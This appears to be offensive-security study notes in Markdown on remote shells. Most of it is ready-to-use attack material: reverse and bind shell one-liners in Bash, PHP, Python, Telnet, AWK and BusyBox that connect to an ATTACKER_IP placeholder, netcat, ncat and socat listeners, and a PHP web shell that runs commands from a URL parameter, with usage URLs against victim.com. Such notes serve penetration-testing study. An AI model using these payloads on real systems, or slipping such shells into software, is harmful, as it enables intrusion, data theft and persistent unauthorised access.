# Shells

## 🐚 Overview

A shell is software that allows interaction with an OS. In offensive security, shells are used to **remotely control compromised systems**.

### What You Can Do With a Shell

| Activity | Description |
|----------|-------------|
| **Remote control** | Execute commands or software remotely on the target system |
| **Privilege escalation** | Gain more elevated access (e.g. root/SYSTEM) |
| **Data exfiltration** | Read and copy sensitive data from the target |
| **Persistence** | Use credentials or backdoor software to maintain access |
| **Post-exploitation** | Deploy malware, create hidden accounts, delete logs, etc. |
| **Pivoting** | Access other systems on the internal network |

---

## 🔁 Reverse Shell

The **target** initiates the connection **back to the attacker** — avoids firewall rules that block inbound connections.

### Step 1 — Attacker: Set Up a Listener

```bash
nc -lvnp 443
```

| Flag | Meaning |
|------|---------|
| `-l` | Listen / wait for a connection |
| `-v` | Verbose mode |
| `-n` | No DNS lookup — don't resolve hostnames |
| `-p 443` | Listen on port 443 |

### Step 2 — Target: Execute the Reverse Shell Payload

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc ATTACKER_IP 443 >/tmp/f
```

**Breakdown:**

| Part | Meaning |
|------|---------|
| `rm -f /tmp/f` | Remove existing named pipe file so a new one can be created |
| `mkfifo /tmp/f` | Create a named pipe (FIFO — First In First Out) for two-way communication |
| `cat /tmp/f` | Read data from the named pipe — waits for input |
| `\| bash -i` | Pipe output into an interactive bash shell to execute commands |
| `2>&1` | Redirect standard error to standard output — errors are sent back to the attacker |
| `\| nc ATTACKER_IP 443` | Pipe shell output to the attacker via Netcat |
| `>/tmp/f` | Send command output back into the named pipe — enables bidirectional communication |

---

## 🔒 Bind Shell

The **target** opens a port and **listens** for the attacker to connect — useful when the attacker can't receive inbound connections.

### Step 1 — Target: Set Up the Bind Shell

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 >/tmp/f
```

| Part | Meaning |
|------|---------|
| `nc -l 0.0.0.0 8080` | Start Netcat in listen mode on all interfaces (`0.0.0.0`) on port 8080 |
| Everything else | Same pipe structure as reverse shell — enables bidirectional communication |

> **Note:** Ports below 1024 require Netcat to be run with elevated privileges.

### Step 2 — Attacker: Connect to the Bind Shell

```bash
nc -nv TARGET_IP 8080
```

| Flag | Meaning |
|------|---------|
| `-n` | No DNS resolution |
| `-v` | Verbose mode |

---

## 👂 Shell Listeners

| Tool | Command | Description |
|------|---------|-------------|
| **Netcat** | `nc -lvnp 443` | Standard listener |
| **rlwrap + Netcat** | `rlwrap nc -lvnp 443` | Wraps nc with GNU readline — adds arrow keys and command history |
| **Ncat** | `ncat -lvnp 4444` | Improved Netcat from the Nmap project — extra features including encryption |
| **Ncat (SSL)** | `ncat --ssl -lvnp 4444` | Encrypted listener using SSL |
| **Socat** | `socat -d -d TCP-LISTEN:443 STDOUT` | Creates socket connections between two data sources. `-d -d` increases verbosity |

---

## 💣 Shell Payloads

Payloads are commands or scripts that expose a shell connection. Below are the most common by language.

### Bash

```bash
# Standard reverse shell
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1

# Readline reverse shell
exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done

# File descriptor 196
0<&196; exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196

# File descriptor 5
bash -i 5<>/dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```

### PHP

```bash
# exec function
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'

# shell_exec function
php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'

# system function — outputs result to browser
php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'

# passthru function — raw output, useful for binary data
php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'

# popen function — opens a process file pointer
php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
```

### Python

```bash
# Using environment variables
export RHOST="ATTACKER_IP"; export RPORT=443; python3 -c \
'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'

# Using subprocess module
python3 -c \
'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("bash")'

# Short version
python3 -c \
'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

### Other Languages

```bash
# Telnet
TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF

# AWK
awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

# BusyBox
busybox nc ATTACKER_IP 443 -e sh
```

---

## 🌐 Web Shell

A web shell is a **script uploaded to a web server** that executes commands through HTTP requests — difficult to detect as it blends in with normal web traffic.

- Written in PHP, ASP, JSP, CGI, etc.
- Deployed by exploiting file upload vulnerabilities

### PHP Web Shell Example

```php
<?php
    if(isset($_GET['cmd'])) {
        system($_GET['cmd']);
    }
?>
```

**How to use after uploading:**

```
# Access the shell
http://victim.com/uploads/shell.php

# Execute a command via the cmd parameter
http://victim.com/uploads/shell.php?cmd=whoami
http://victim.com/uploads/shell.php?cmd=id
http://victim.com/uploads/shell.php?cmd=ls+-la
```

### Web Shell Resources

| Shell | Link | Features |
|-------|------|----------|
| p0wny-shell | [github.com/flozz/p0wny-shell](https://github.com/flozz/p0wny-shell) | Remote command execution |
| b374k | [github.com/b374k/b374k](https://github.com/b374k/b374k) | File management, command execution and more |
| r57shell | [r57shell.net](https://www.r57shell.net/index.php) | Extensive functionality |

---

## 📋 Quick Reference

```bash
# Set up reverse shell listener
nc -lvnp 443
rlwrap nc -lvnp 443          # With arrow keys and history
ncat --ssl -lvnp 443         # Encrypted

# Reverse shell payload (target machine)
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1

# Bind shell (target machine — opens port 8080)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 >/tmp/f

# Connect to bind shell (attacker machine)
nc -nv TARGET_IP 8080
```
